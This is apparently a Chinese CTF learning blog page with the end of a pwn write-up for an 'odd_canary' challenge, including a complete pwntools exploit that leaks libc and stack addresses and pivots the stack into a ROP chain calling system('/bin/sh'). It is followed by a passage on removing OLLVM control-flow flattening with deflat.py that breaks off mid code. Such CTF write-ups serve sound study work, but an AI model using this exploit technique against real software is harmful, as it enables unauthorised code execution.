<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 buf[<span class="number">5</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  v1 = v3;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your payload: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x40u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="string">&quot;exec&quot;</span>, <span class="number">4uLL</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Processed: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">  __writefsqword(<span class="number">0x28u</span>, v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Arch:       amd64-64-little</span><br><span class="line">RELRO:      Full RELRO</span><br><span class="line">Stack:      Canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        No PIE (0x400000)</span><br><span class="line">SHSTK:      Enabled</span><br><span class="line">IBT:        Enabled</span><br><span class="line">Stripped:   No</span><br></pre></td></tr></table></figure>

<p>开启了canary,但是不影响</p>
<p>先看good_news puts的被放在了bss段bss:0000000000404080 bss，name在bss:0000000000404060 name，然后有个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Great, the good news is that I know your real name,%s\n&quot;, (const char *)buf);</span><br></pre></td></tr></table></figure>

<p>我们可以利用取个0x20的name，如果数据中没有空字节，<code>name</code> 不会以空字节终止，我们就可以利用其接着泄露出puts的地址。</p>
<p>接着看vuln，  read(0, buf, 0x40uLL);存在栈溢出，但是能利用的只有0x10正好是栈迁移的标志。</p>
<p>但是我们还缺少一个栈的地址，可以在exit_a将栈地址放入bss段再到good函数泄露出栈的地址，然后再用栈迁移getshell。</p>
<p>exp</p>
<p>是战队里一个师傅写出来的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">call_read = <span class="number">0x401440</span></span><br><span class="line">leave_ret = <span class="number">0x4014B6</span></span><br><span class="line">bss = <span class="number">0x404060</span></span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./odd_canary&quot;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">io = process(pwnfile)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">good_news</span>(<span class="params">io, payload, is_leak=<span class="literal">False</span></span>):</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Choose (good/vuln/exit): &quot;</span>, <span class="string">b&#x27;good&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> is_leak:</span><br><span class="line">        io.recv(<span class="built_in">len</span>(<span class="string">&quot;I will tell you good news,&quot;</span>)+<span class="number">0x20</span>)</span><br><span class="line">        leak = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">    io.sendafter(<span class="string">b&quot;but you must tell me your name first:&quot;</span>,  payload)</span><br><span class="line">    <span class="keyword">return</span> leak <span class="keyword">if</span> is_leak <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">good_news(io, flat(cyclic(<span class="number">0x20</span>)))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">libc.address = good_news(io, flat(cyclic(<span class="number">0x20</span>)), <span class="literal">True</span>) - <span class="number">0x8db60</span> </span><br><span class="line">success(<span class="string">f&quot;libc.address: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;Choose (good/vuln/exit): &quot;</span>, <span class="string">b&#x27;exit&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&quot;Are you sure ? [y/n]\n&quot;</span>, <span class="string">b&#x27;n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = good_news(io, flat(cyclic(<span class="number">0x20</span>)), <span class="literal">True</span>)</span><br><span class="line">success(<span class="string">f&quot;stack_addr: <span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">str_bin_sh = libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">success(<span class="string">f&quot;str_bin_sh: <span class="subst">&#123;<span class="built_in">hex</span>(str_bin_sh)&#125;</span>&quot;</span>)</span><br><span class="line">system_addr = libc.sym.system</span><br><span class="line">success(<span class="string">f&quot;system_addr: <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>&quot;</span>)</span><br><span class="line">ret = leave_ret + <span class="number">1</span></span><br><span class="line">pop_rdi = libc.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>), executable=<span class="literal">True</span>).__next__()</span><br><span class="line">success(<span class="string">f&quot;pop_rdi: <span class="subst">&#123;<span class="built_in">hex</span>(pop_rdi)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;Choose (good/vuln/exit): &quot;</span>, <span class="string">b&#x27;vuln&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&quot;Enter your payload: \n&quot;</span>, <span class="string">b&#x27;exec&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;a&#x27;</span>) + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr) + p64(<span class="number">0x0</span>) + p64(stack_addr-<span class="number">0x27</span>) + p64(leave_ret))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>但是我在本地复现，查看bss段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x00404020</span><br><span class="line">0x404020 &lt;stdout@@GLIBC_2.2.5&gt;:	0x000079ba9ae045c0	0x0000000000000000</span><br><span class="line">0x404030 &lt;stdin@@GLIBC_2.2.5&gt;:	0x000079ba9ae038e0	0x0000000000000000</span><br><span class="line">0x404040 &lt;heap_buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x404050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x404060 &lt;name&gt;:	0x6161616261616161	0x6161616461616163</span><br><span class="line">0x404070:	0x000000000000000a	0x0000000000000000</span><br><span class="line">0x404080 &lt;bss&gt;:	0x000079ba9ac87be0	0x7572742073796177</span><br><span class="line">0x404090 &lt;bss+16&gt;:	0x6320656874207473	0x00002e7972616e61</span><br><span class="line">0x4040a0 &lt;bss+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x4040b0 &lt;bss+48&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>puts的地址0x000079ba9ac87be0和给的libc不一样，暂时还不知道哪里的问题。</p>
<p>OK我发现问题在哪里了，原来它加载的是我本地libc.so.6不是题目给的。直接换用自己的libc.so.6就可以打通了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/09/09/%E5%8E%BB%E9%99%A4%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/09/09/%E5%8E%BB%E9%99%A4%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/" class="post-title-link" itemprop="url">去除控制流平坦化</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-09-09 09:17:54" itemprop="dateCreated datePublished" datetime="2025-09-09T09:17:54+08:00">2025-09-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 21:13:43" itemprop="dateModified" datetime="2025-09-23T21:13:43+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/%E6%80%BB%E7%BB%93/%E5%8E%BB%E9%99%A4%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/" itemprop="url" rel="index"><span itemprop="name">去除控制流平坦化</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="什么是OLLVM的平坦化"><a href="#什么是OLLVM的平坦化" class="headerlink" title="什么是OLLVM的平坦化"></a>什么是OLLVM的平坦化</h2><p><strong>控制流平坦化</strong> 是 OLLVM 提供的一种<strong>代码混淆</strong>技术。它的核心目标是<strong>破坏程序原始的控制流结构</strong>，使其变得难以阅读和分析，从而增加逆向工程和破解的难度。</p>
<h2 id="OLLVM的平坦化是如何实现的？"><a href="#OLLVM的平坦化是如何实现的？" class="headerlink" title="OLLVM的平坦化是如何实现的？"></a>OLLVM的平坦化是如何实现的？</h2><p>原始代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> (a &gt; <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a &gt; 5&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a &lt;= 5&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>经过平坦化后：</strong></p>
<ol>
<li><strong>创建“分发器”和一个状态变量</strong>：<ul>
<li>引入一个<strong>状态变量</strong>（例如 <code>state</code>），它决定了下一个要执行哪个基本块。</li>
<li>创建一个<strong>循环结构</strong>作为分发器，其内部是一个巨大的 <code>switch-case</code> 语句，<code>case</code> 的值就是 <code>state</code> 的值。</li>
</ul>
</li>
<li><strong>拆分原始基本块</strong>：<ul>
<li>将原始函数中的所有基本块（除了入口块）都提取出来。</li>
<li>为每个基本块分配一个<strong>唯一的状态值</strong>（例如，原始块 <code>B</code> 对应 <code>state = 2</code>）。</li>
</ul>
</li>
<li><strong>重写基本块末尾的指令</strong>：<ul>
<li>这是最关键的一步。修改每个基本块的<strong>结束指令</strong>（如 <code>jmp</code>, <code>br</code>， <code>ret</code>），使其不再是直接跳转到下一个块，而是<strong>更新状态变量 <code>state</code><strong>，然后</strong>跳回到分发器循环</strong>。</li>
<li>例如，原始基本块 <code>A</code> 执行完后应该跳转到块 <code>B</code>。平坦化后，块 <code>A</code> 的末尾被修改为 <code>state = 2; goto dispatcher;</code>。</li>
</ul>
</li>
<li><strong>在分发器中调度</strong>：<ul>
<li>分发器循环不停地检查 <code>state</code> 的值，然后通过 <code>switch-case</code> 跳转到对应的基本块去执行。</li>
<li>执行完的基本块会设置新的 <code>state</code>，然后跳回分发器，分发器再根据新的 <code>state</code> 调度下一个基本块。</li>
</ul>
</li>
</ol>
<p>平坦化后的伪代码结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> state = <span class="number">0</span>; <span class="comment">// 初始状态</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;    <span class="comment">// 分发器循环</span></span><br><span class="line">        <span class="keyword">switch</span> (state) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">// 初始块，通常做变量初始化</span></span><br><span class="line">                a = <span class="number">10</span>;</span><br><span class="line">                <span class="keyword">if</span> (a &gt; <span class="number">5</span>) &#123;</span><br><span class="line">                    state = <span class="number">1</span>; <span class="comment">// 下一个状态是 “printf(&quot;a &gt; 5&quot;)” 块</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    state = <span class="number">2</span>; <span class="comment">// 下一个状态是 “printf(&quot;a &lt;= 5&quot;)” 块</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;a &gt; 5&quot;</span>);</span><br><span class="line">                state = <span class="number">3</span>; <span class="comment">// 下一个状态是 “return 0” 块</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;a &lt;= 5&quot;</span>);</span><br><span class="line">                state = <span class="number">3</span>; <span class="comment">// 下一个状态是 “return 0” 块</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="comment">// state 不再更新，循环终止</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="如何去OLLVM的平坦化"><a href="#如何去OLLVM的平坦化" class="headerlink" title="如何去OLLVM的平坦化"></a>如何去OLLVM的平坦化</h2><h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>首先我要下载这个deflat这个工具，将py文件和要处理的文件放在同一个目录中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python deflat.py -f OLLVM-deflat --addr 0x4006F0</span><br><span class="line">python deflat.py -f 需要处理的文件 --addr 起始地址</span><br></pre></td></tr></table></figure>

<p>起始地址用IDA查看，比如main的起始地址。</p>
<p>本题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python deflat.py -f OLLVM-deflat --addr 0x4006F0</span><br><span class="line">python deflat.py -f OLLVM-deflat --addr 0x400870</span><br><span class="line">python deflat.py -f OLLVM-deflat --addr 0x401470</span><br><span class="line">python deflat.py -f OLLVM-deflat --addr 0x4018B0</span><br><span class="line">python deflat.py -f OLLVM-deflat --addr 0x401F50</span><br><span class="line">python deflat.py -f OLLVM-deflat --addr 0x402AC0</span><br></pre></td></tr></table></figure>

<p>让我们来看看效果</p>
<p>未去：</p>
<p><img src="/2025/09/09/%E5%8E%BB%E9%99%A4%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/%E6%9C%AA%E5%8E%BB%E5%B9%B3%E5%9D%A6%E5%8C%96.png" alt="1"></p>
<p><img src="/2025/09/09/%E5%8E%BB%E9%99%A4%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/%E6%9C%AA%E5%8E%BB.png" alt="2"></p>
<p>已去：</p>
<p><img src="/2025/09/09/%E5%8E%BB%E9%99%A4%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/%E5%8E%BB%E9%99%A4%E5%B9%B3%E5%9D%A6%E5%8C%96.png" alt="1"></p>
<p><img src="/2025/09/09/%E5%8E%BB%E9%99%A4%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/%E5%B7%B2%E5%8E%BB.png" alt="1"></p>
<p>很明显去除后逻辑更加清晰。</p>
<p>去除后再开始解题：</p>
<p>general_inspection验证sudoku的合法性</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">general_inspection</span><span class="params">(<span class="type">int</span> (*a1)[<span class="number">9</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> mm; <span class="comment">// [rsp+100h] [rbp-50h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+104h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> m; <span class="comment">// [rsp+104h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [rsp+104h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> ii; <span class="comment">// [rsp+104h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> jj; <span class="comment">// [rsp+104h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> kk; <span class="comment">// [rsp+104h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+108h] [rbp-48h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10Ch] [rbp-44h]</span></span><br><span class="line">  <span class="type">int</span> s[<span class="number">12</span>]; <span class="comment">// [rsp+110h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> (*v12)[<span class="number">9</span>]; <span class="comment">// [rsp+140h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v12 = a1;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x28u</span>LL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">9</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v12[i][j] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">10</span>; ++k )</span><br><span class="line">          s[k] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">9</span>; ++m )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v12[i][m] )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( s[v12[i][m]] )</span><br><span class="line">              <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            s[v12[i][m]] = <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt; <span class="number">10</span>; ++n )</span><br><span class="line">          s[n] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt; <span class="number">9</span>; ++ii )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v12[ii][j] )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( s[v12[ii][j]] )</span><br><span class="line">              <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            s[v12[ii][j]] = <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> ( jj = <span class="number">0</span>; jj &lt; <span class="number">10</span>; ++jj )</span><br><span class="line">          s[jj] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( kk = <span class="number">0</span>; kk &lt; <span class="number">3</span>; ++kk )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">for</span> ( mm = <span class="number">0</span>; mm &lt; <span class="number">3</span>; ++mm )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v12[kk - <span class="number">-3</span> * (i / <span class="number">3</span>)][mm - <span class="number">-3</span> * (j / <span class="number">3</span>)] )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( s[v12[<span class="number">3</span> * (i / <span class="number">3</span>)][<span class="number">9</span> * kk + <span class="number">3</span> * (j / <span class="number">3</span>) + mm]] )</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">              s[v12[<span class="number">3</span> * (i / <span class="number">3</span>)][<span class="number">9</span> * kk + mm - <span class="number">-3</span> * (j / <span class="number">3</span>)]] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> trace对sudoku进行求解</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span 